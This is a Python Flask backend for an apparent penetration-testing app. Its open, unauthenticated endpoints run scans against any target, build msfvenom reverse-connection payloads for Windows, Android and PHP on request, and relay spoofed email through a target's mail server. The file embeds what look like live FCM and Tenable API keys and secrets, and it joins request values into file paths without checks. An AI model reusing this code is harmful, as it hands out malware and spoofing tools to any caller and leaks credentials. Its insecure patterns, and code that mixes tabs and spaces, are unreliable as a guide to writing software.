from flask import Flask,request,jsonify,render_template,send_from_directory

from flask_cors import CORS
#import sys
#sys.path.insert(0,'/whois/whoise')
#import whoisData

#whois scriptt
from whois.whois_script import *

from datetime import datetime
import hashlib

from xss.interface import *

from testssl.interface import *

#Nessus api
from tenable_io.client import TenableIOClient
from socket import gethostbyname

#background processes call,smtp,nmap
import subprocess
from subprocess import call
import os
import nmap
import socket


#FCM notification
from pyfcm import FCMNotification


app=Flask(__name__,static_url_path='/static')
CORS(app)



@app.route('/')
def helo():
        return 'helo world'

#Get data for whois
@app.route('/whoiss',methods=['POST'])
def whoiss():
	req_data=request.get_json()
	targetUrl=req_data['url']
        targetUrl=targetUrl.replace("www.","")
        try:
                testIp=gethostbyname(targetUrl)
                result=whois_cal(targetUrl)
	        return jsonify(result)
        except:
                return jsonify(
                        result=False
                )


#Get data fro XSS
@app.route('/xss_check',methods=['POST'])
def xsss():
	req_data=request.get_json()
	targetUrl=req_data['url']
        device_token=req_data['reg_token']
        try:
                testIp=socket.gethostbyname(targetUrl)
        except:
                return jsonify(
                        result=False
                )
        
	##f=open("xssReport.txt","w")
	hashToken=hashlib.md5(device_token).hexdigest()
	fileName=req_data['filename']
	fileName=hashToken+'_'+fileName
	#fileName=fileName+".txt"
	#with open(fileName,'w') as f:
        #subprocess.call(["python","xsssnipertest.py","-u",targetUrl],stdout=f)
	#convert.convert_txt_pdf(fileName)
	xss_inter(targetUrl,fileName)
	push_service = FCMNotification(api_key="AIzaSyB4BBdlKyxQaB9ZBL1U4ynZz3nDNW9vsmo")
        registration_id = device_token
        data={
        	"title":"XSS Report",
        	"message":"Your report "+req_data['filename']+" for XSS has been generated"
        	
        }
        #message_title = "XSS Report"
        #message_body = "Your report has been generated"
        result = push_service.notify_single_device(registration_id=registration_id, data_message=data)
	return jsonify(
                reportGenerated=True
        )
		
		
#Get data for payload Generation		
@app.route('/payload',methods=['POST'])
def payLoad():
	req_data=request.get_json()
	platform=req_data['platform']
	payloadType=req_data['payloadType']
	callType=req_data['callType']
	lHost=req_data['lhost']
	lPort=req_data['lport']
	payloadName=req_data['name']
	if platform=='windows':
		payloadName=payloadName+".exe"
	elif platform=='android':
		payloadName=payloadName+".apk"
	elif platform=='php':
		payloadName=payloadName+".php"
	payloadDetail=platform+"/"+payloadType+"/"+callType
        pathPayload="/home/tejas/Desktop/website/"+payloadName
	lHost="LHOST="+lHost
	lPort="LPORT="+lPort
	with open(pathPayload,'w') as f:
		subprocess.call(['msfvenom',"-p",payloadDetail,lHost,lPort],stdout=f)
	
	path_from_payload="/home/tejas/Desktop/website/"+payloadName
	path_to_payload="/home/tejas/Desktop/website/static/reports/payload/"+payloadName
        #path_to_pdf="/home/ubuntu/website/reports/payload/"+payloadName
        subprocess.call(["mv",path_from_payload,path_to_payload])
	return jsonify(
                payloadGenerated=True
        )
	

#Get data for testing ssl vulnerabilities
@app.route('/testssl',methods=['POST'])
def testSsl():
	req_data=request.get_json()
	testUrl=req_data['url']
        device_token=req_data['reg_token']
        '''try:
                testIp=socket.gethostbyname(targetUrl)
        except:
                return jsonify(
                        result=False
                )'''
        hashToken=hashlib.md5(device_token).hexdigest()
	fileName=req_data['filename']
	fileName=hashToken+'_'+fileName
	ssl_inter(testUrl,fileName)
        '''fileName=fileName+".txt"
	with open(fileName,'w') as f:
		subprocess.call(["./testssl.sh","-U",testUrl],stdout=f)
	convert.convert_txt_pdf(fileName)'''
        push_service = FCMNotification(api_key="AIzaSyB4BBdlKyxQaB9ZBL1U4ynZz3nDNW9vsmo")
        registration_id = device_token
        data={
        	"title":"SSL Report",
        	"message":"Your report "+req_data['filename']+" for SSL has been generated"
        	
        }
        #message_title = "SSL Report"
        #message_body = "Your report has been generated"
        result = push_service.notify_single_device(registration_id=registration_id, data_message=data)
	return jsonify(
                reportGenerated=True
        )
	
#Get data for running nessus scan
@app.route('/test_nessus',methods=['POST'])
def test_nessus():
	req_data=request.get_json()
	testUrl=req_data['url']
	scanName=req_data['name']
        device_token=req_data['reg_token']
        hashToken=hashlib.md5(device_token).hexdigest()
	testIp=gethostbyname(testUrl)
	reportName=scanName+".pdf"
	reportName=hashToken+'_'+reportName
        path_report="/home/tejas/Desktop/website/"+reportName
	client = TenableIOClient(access_key='135b739644f7f56f6e39fa6f45d00ccdc199fb15793ddf324a7ad0e4526e1b95', secret_key='ff6d61f566c11479154f68dc8f0a6ebf35aa961d65329a01a41349638face336')
	scan = client.scan_helper.create(name=scanName, text_targets=testIp, template='basic')
	scan.launch().download(path_report, scan.histories()[0].history_id)
	#path_from_pdf="/home/ubuntu/website/"+reportName
	path_to_pdf="/home/tejas/Desktop/website/static/reports/nessus/"+reportName
	subprocess.call(["mv",path_report,path_to_pdf])
        push_service = FCMNotification(api_key="AIzaSyB4BBdlKyxQaB9ZBL1U4ynZz3nDNW9vsmo")
        data={
        	"title":"Nessus Report",
        	"message":"Your report "+req_data['name']+" for Nessus has been generated"
        	
        }
        #message_title = "Nessus Report"
        #message_body = "Your report has been generated"
        result = push_service.notify_single_device(registration_id=device_token,data_message=data)
	return jsonify(
                reportGenerated=True
        ) 
		
 	
 	
#smtp open relay exploitation
@app.route('/check_smtp',methods=['POST'])
def check_smtp():
	req_data=request.get_json()
	testUrl=req_data['url']
	testUrl=testUrl.replace("http://","")
	while True:
		try:
			testIp=gethostbyname(testUrl)
			return port_check(testIp)
		except socket.gaierror:
			return jsonify(
                                result=False
                        )

def port_check(ipAddr):
	ip_str=str(ipAddr)
	"""nm=nmap.PortScanner()
	real_check=nm.scan(ipAddr,'24-30')
	if 25 in real_check['scan'][ip_str]['tcp']:
		if real_check['scan'][ip_str]['tcp'][25]['state']=='open':
			return jsonify(
				exploit=True
		        )
		else:
			r`eturn jsonify(
				exploit=False
			)
	else:
		return jsonify(
			expoit=False
		)"""
        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        result=sock.connect_ex((ip_str,25))
        if result==0:
                return jsonify(
                        exploit=True
                )
        else:
                return jsonify(
                        exploit=False
                )


@app.route('/smtp_exploit',methods=['POST'])
def smtp_exploit():
	import smtplib
	import email
	from email.message import Message
	msg=email.message.Message()
	req_data=request.get_json()
	mail_from=req_data['sender']
	mail_to=req_data['recipient']
	mail_subj=req_data['mailSubject']
	mail_body=req_data['mailBody']
	testUrl=req_data['url']
	msg["From"]=mail_from
	msg["To"]=mail_to
	msg["Subject"]=mail_subj
	msg["body"]=mail_body
	testUrl=testUrl.replace("http://www.","")
	testUrl=testUrl.replace("www.","")
	mail_server="mail."+testUrl
	server=smtplib.SMTP(mail_server,25)
	server.starttls()
	server.ehlo_or_helo_if_needed()
	try:
		failed=server.sendmail(mail_from,mail_to,msg.as_string())
		server.close()
		return jsonify(
                        exploitSent=True
                )
	except Exception as e:
		return jsonify(
                        exploitSent=False
                )

	
#Nmap scan
@app.route('/nmap_scan',methods=['POST'])
def nmap_scan():
        #try:
        req_data=request.get_json()
	ip_addr=req_data["ip"]
        ip_p=socket.gethostbyname(ip_addr)
	#ip_str=str(ip_addr)
	nm=nmap.PortScanner()
	t1=datetime.now()
	real_check=nm.scan(ip_p,"1-1024")
	t2=datetime.now()
	total=t2-t1
	#nm.scan(ip_addr,"1-1024")
	#return nm.csv()
        print total
        return jsonify(real_check['scan'][ip_p])
        
        #except:
        #        return jsonify(
        #                result=False
        #        )
        
@app.route('/download/<path:filepath>')
def report_download(filepath):
        return send_from_directory('static',filepath)
        #return 'Hello World'
        
if __name__ == '__main__':
	app.run(host='192.168.137.158')

